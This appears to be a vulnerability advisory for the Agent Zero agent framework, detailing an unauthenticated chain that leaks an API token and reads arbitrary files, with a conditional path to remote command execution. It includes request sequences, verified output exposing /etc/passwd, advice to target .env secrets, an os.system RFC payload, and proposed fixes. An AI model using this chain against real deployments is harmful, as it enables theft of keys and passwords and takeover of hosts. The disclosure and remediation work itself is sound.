# Agent Zero: unauthenticated arbitrary file read

## Summary

Agent Zero's default deployment has no login credential configured, and its `requires_auth`
decorator treats a missing credential hash as permission to proceed. Three endpoints chain
into full unauthenticated file disclosure:

1. `GET /api/csrf_token` — no credentials needed; returns a CSRF token **and `runtime_id`**.
   Its origin check self-registers the first non-localhost Origin into `ALLOWED_ORIGINS`.
2. `POST /api/settings_get` — no credentials needed; returns the settings document, in which
   `mcp_server_token` is **not** masked (every `api_keys` entry is masked to `************`
   in the same response).
3. `POST /api/api_files_get` — takes the token from step 2 as `X-API-KEY` and returns the
   base64 contents of **any absolute path** supplied by the caller.

The attacker needs nothing. No account, no token, no interaction.

Verified end to end against upstream `main` @ 2026-11-05: all three requests returned HTTP
200 and `/etc/passwd` was returned in the response body.

## Affected versions

Agent Zero, vendor Agent Zero, repository https://github.com/agent0ai/agent-zero.

Verified against `main` at 2026-11-05.

The condition depends on the deployment, not the release: any instance started without
`AUTH_LOGIN` set is affected. The three startup paths
(`docker/run/fs/exe/initialize.sh`, `docker/run/fs/exe/run_A0.sh`,
`docker/base/fs/ins/after_install.sh`) do not set it, so this is the default state.

## Vulnerability type

CWE-306 (Missing Authentication for Critical Function),
CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor),
CWE-22 (Improper Limitation of a Pathname to a Restricted Directory).

CVSS v3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`, 7.5 High.
Escalates to 9.8 if `.env` carries `RFC_PASSWORD` (see the RFC section).

## The chain

### 1. Authentication fails open (`helpers/api.py:175-187`)

```python
def requires_auth(f):
    @wraps(f)
    async def decorated(*args, **kwargs):
        from helpers import login
        user_pass_hash = login.get_credentials_hash()
        if not user_pass_hash:
            return await f(*args, **kwargs)          # no credentials: allow
```

`helpers/login.py:5-10` only looks at `AUTH_LOGIN`:

```python
def get_credentials_hash():
    user = dotenv.get_dotenv_value(dotenv.KEY_AUTH_LOGIN)
    password = dotenv.get_dotenv_value(dotenv.KEY_AUTH_PASSWORD)
    if not user:
        return None
    return hashlib.sha256(f"{user}:{password}".encode()).hexdigest()
```

`helpers/api.py:264-274` shows the decorator is applied exactly as the handler declares, so
every `requires_auth() == True` endpoint is served anonymously in the default state.

### 2. The settings endpoint leaks the API token (`helpers/settings.py:273-370`)

```python
out = SettingsOutput(settings = settings.copy(), ...)      # :274  full dict copied first
...
settings["api_keys"][provider_name] = API_KEY_PLACEHOLDER
out["settings"]["auth_password"] = PASSWORD_PLACEHOLDER if ...
out["settings"]["rfc_password"]  = PASSWORD_PLACEHOLDER if ...
out["settings"]["root_password"] = PASSWORD_PLACEHOLDER if ...
out["settings"]["secrets"]       = secrets_manager.get_masked_secrets()
```

`mcp_server_token` is absent from that list. It is injected in `normalize_settings()`
(`:494`) as `create_auth_token()`:

```python
hash_bytes = hashlib.sha256(f"{runtime_id}:{username}:{password}".encode()).digest()
return base64.urlsafe_b64encode(hash_bytes).decode().replace("=", "")[:16]
```

Nothing to crack — it is returned in the response body.

### 3. The file endpoint opens anything (`api/api_files_get.py`)

```python
else:
    external_path = path                       # caller's path, verbatim
if not os.path.exists(external_path):
    continue
with open(external_path, "rb") as f:           # no allowlist, no containment
    base64_content = base64.b64encode(f.read()).decode()
```

`helpers/files.py:576-584` does not normalize either:

```python
def _resolve_path(*relative_paths):
    if len(relative_paths) == 1 and os.path.isabs(relative_paths[0]):
        return relative_paths[0]
    return os.path.join(_base_dir, *relative_paths)
```

The `else` branch needs no traversal. The `/a0/` branch reaches the same place through
`/a0/../../etc/passwd`.

### 4. A fourth issue on the same path: Origin self-registration

`api/csrf_token.py` has `requires_csrf = False` and inherits `requires_auth = True`. Its
origin gate calls `initialize_allowed_origins()`, which persists the first non-localhost
Origin it ever sees:

```python
allowed_origins.append(req_origin)
dotenv.save_dotenv_value(ALLOWED_ORIGINS_KEY, ",".join(allowed_origins))
```

An attacker-chosen Origin therefore whitelists itself. The same response also discloses
`runtime_id`, one of the three HMAC inputs to `create_auth_token()` — so the token is
derivable even without reading the settings endpoint.

## Verified end-to-end output

Service built from upstream `main` @ 2026-11-05 using the original `register_api_route()`
and the original handlers/decorators. Only LLM / vector-store / secrets-extension imports
were stubbed so the module tree would import; none of the verified paths is stubbed.

```
[环 0] GET /api/csrf_token  (no credentials, Origin: http://attacker.example)
  {"ok": true, "token": "WJeb-S-INew0rnZp1Q9tXxL9Y6MZr8duLQTlxb_PipQ",
   "runtime_id": "e3feceb9b9c7b621"}

[环 1] POST /api/settings_get  (no credentials, carrying the CSRF token)
  HTTP 200
  mcp_server_token : 'CMo-f9k9nAxGQZOz'
  auth_password    : ''
  api_keys         : {'************'}

[环 2] POST /api/api_files_get  (X-API-KEY: the token above)
  HTTP 200
  [passwd] root:x:0:0:root:/root:/usr/bin/zsh
           daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

The masking contrast in step 2 is the core evidence: 33 `api_keys` masked to
`************` in the same JSON document, while `mcp_server_token` is the real 16-character
value.

Endpoint naming trap: the URL is `/api/api_files_get`, matching the file name.
`/api/files_get` returns 404.

## Reproduction

```bash
./poc/exploit.sh http://TARGET:50001 /etc/passwd
```

The script performs the three requests above with `curl` and prints the decoded file.

The highest-value target is not `/etc/passwd`. Read the harness `.env` to obtain every
provider API key plus `AUTH_PASSWORD` / `RFC_PASSWORD` / `ROOT_PASSWORD`.

## Conditional escalation to RCE

If `.env` contains `RFC_PASSWORD`, `POST /api/rfc` (`requires_auth = False`, no API key) is
reachable. `helpers/rfc.py:44-66` validates an HMAC over the body and then executes:

```python
imp = importlib.import_module(module)
func = getattr(imp, function_name)
```

No module or function allowlist. Sending `{"module":"os","function_name":"system","args":["..."]}`
is arbitrary command execution. When `RFC_PASSWORD` is unset, `_get_rfc_password()` raises
and the endpoint fails closed.

## Fix

1. `requires_auth` must fail closed when no credentials exist, and force initial credential
   setup on first run.
2. Add `mcp_server_token` to the `convert_out` masking list.
3. `api_files_get` needs an allowlist, not a passthrough `else`.
4. `_resolve_path` must normalize `..` and enforce containment.
5. Do not self-register Origins into the persisted allowlist.
6. `helpers/rfc._get_function` needs an allowlist.
7. Tests: anonymous `settings_get` → 401; no `mcp_server_token` in its body; `api_files_get`
   with `/etc/passwd` → rejected.

## Verification limits

- The service was assembled from `register_api_route()` plus the original handlers; it is
  not a full `run_ui.py` boot (`initialize` / `helpers.secrets` extension were stubbed).
  The three verified paths are original code.
- No reverse proxy or gateway-level auth was in front; a deployment behind authenticated
  ingress would narrow the exposure.
- `/root/.ssh/id_rsa` did not exist in the test environment, so `/etc/passwd` is the sample.

## Timelines

- 2026-11-05 — chain identified in upstream `main`
- 2026-11-05 — end-to-end verification
- 2026-11-05 — this repository published
- pending — vendor notification
